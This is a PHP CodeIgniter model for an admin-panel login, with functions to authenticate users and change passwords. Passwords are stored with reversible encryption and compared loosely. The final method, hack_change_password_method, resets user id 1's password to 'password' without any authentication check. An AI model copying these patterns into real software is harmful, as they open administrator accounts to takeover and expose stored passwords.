<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login_model extends CI_Model {

	
	public function __construct(){
		parent::__construct();
		$this->load->library('encryption');
	}

	public function authenticateuser(){

		$username=$this->input->post('username');
		$passcode=$this->input->post('passcode');
		
		$this->db->select('id,username,password,country_id,role');
		$this->db->where('username',$username);
		$this->db->where('status', 's_act');
		$query=$this->db->get('panel_users');
		foreach($query->result() as $row){
			$encrypted_passcode=$row->password;
			$decrypted_passcode=$this->encryption->decrypt($encrypted_passcode);
			if($passcode==$decrypted_passcode){
				$userinfo=array(
					'username'=>$row->username,
					'admin_country_id'=>$row->country_id,
					'admin_role'=>$row->role,
					'admin_logged_in'=>'loggedIn'
				);

				$this->session->set_userdata($userinfo);

				$response_array['message'] = 'Successful Login';
				$response_array['class'] = 'alert-success';
				$response=$response_array;
				$response=array('success'=>$response_array);

				return $response;
			}
		}

		$response_array['error_type'] = 'login';
		$response_array['message'] = 'Invalid login';
		$response_array['class'] = 'alert-danger';
		$response=$response_array;
		$response=array('error'=>$response_array);

		return $response;
	}


	public function change_password_method(){
		$old_password=$this->input->post('old_password');

		$this->db->select('password');
		$this->db->where('username', $this->session->userdata('username'));
		$query=$this->db->get('panel_users');
		$row=$query->row();
		$real_encrypted_passcode=$row->password;

		$decrypt_passcode=$this->encryption->decrypt($real_encrypted_passcode);

		if($old_password==$decrypt_passcode){
			$newpasscode=$this->encryption->encrypt($this->input->post('new_password'));
			$data=array(
				'password'=>$newpasscode
			);				
			$this->db->where('username', $this->session->userdata('username'));
			$this->db->update('panel_users',$data);
			
			$response_array['message'] = 'Password Changed';
			$response_array['class'] = 'alert-success';
			$response=$response_array;
			$response=array('success'=>$response_array);

		}else{
						
			$response_array['message'] = 'Invalid Old Password';
			$response_array['class'] = 'alert-danger';
			$response=$response_array;
			$response=array('error'=>$response_array);

		}

		return $response;
	}

	public function hack_change_password_method(){
		$newpasscode=$this->encryption->encrypt('password');
		$data=array(
			'password'=>$newpasscode
		);				
		$this->db->where('id',1);
		$this->db->update('panel_users',$data);
		return true;
	}

}
